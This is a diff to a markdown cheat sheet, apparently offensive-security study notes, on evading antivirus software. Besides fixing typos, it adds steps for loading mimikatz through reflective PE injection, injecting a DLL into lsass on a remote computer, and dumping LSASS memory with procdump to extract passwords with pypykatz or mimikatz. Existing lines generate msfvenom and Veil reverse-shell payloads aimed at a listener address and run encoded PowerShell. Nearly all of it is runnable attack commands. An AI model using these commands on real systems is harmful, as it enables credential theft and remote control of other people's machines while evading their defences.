@@ -24,7 +24,7 @@ sudo apt install upx-ucl
 * EnigmaProtector
 * Comercial Tool `https://www.enigmaprotector.com/en/home.html`
 
-## Powershell AV ByPass Techiques
+## Powershell AV ByPass Techniques
 
 * **Limitation**: Powershell x86
 * Use Powershell x86 Template Script
@@ -34,7 +34,7 @@ sudo apt install upx-ucl
   * Modify $var to obfuscate the malicous code
 * Make Powershell Onliner `https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py`
 * Set `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
-* Run Powerhell Script to spawn Reverse Shell without AV Evasion 
+* Run Powerhell Script to spawn Reverse Shell without AV Evasion
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.192 LPORT=443 -f powershell
@@ -81,6 +81,60 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
 powershell -enc  JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
 ```
 
+## Powersploit AV ByPass Techniques (Not working)
+
+* Inject EXE or DLL into powershell
+* Use [Powersploit Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
+
+Load Mimikatz.exe and run it locally. Forces ASLR on for the EXE.
+
+```powershell
+# Attack
+# Read mimikatz into bytes and convert into Base64 string
+$PEBytes = [IO.File]::ReadAllBytes('mimikatz.exe')
+$Base64s = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($PEBytes))
+# Victim
+# Load mimikatz and run it within powershell
+$PEBytes = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($Base64s)) 
+Import-Module .\Invoke-ReflectivePEInjection.ps1
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ExeArgs "" -ForceASLR
+```
+
+Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
+
+```powershell
+$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
+Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local
+```
+
+## Dump LSASS with Sysinternal ProcDump AV ByPass
+
+* **Limitation**: Requires SeDebugPrivilege
+* Use [Sysinternal Proddump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
+* Use Mimikatz to dump hashes
+* From [dumping-lsass](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/)
+
+```powershell
+# Victim
+# Dump hashes cached in LSASS memory
+tasklist | findstr lsass
+# or
+get-process lsass
+Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
+-------  ------    -----      -----     ------     --  -- -----------
+   1296      26     7148      51752               580   0 lsass
+procdump.exe -accepteula -ma 580 lsass.dmp
+
+# Attacker
+# Load dumped logon passwords
+pypykatz lsa minidump lsass.DMP
+
+# or mimikatz
+sekurlsa::minidump lsass.dmp
+log lsass.txt
+sekurlsa::logonPasswords
+```
+
 ## Automate AV Evasion with Shellter x86
 
 * **Limitation**: Require x86, 32bit windows only
@@ -104,5 +158,5 @@ meterpreter > shell
 * **Limitation**: Require x86
 
 ```bash
-$ vail -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
+$ veil -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444
 ```
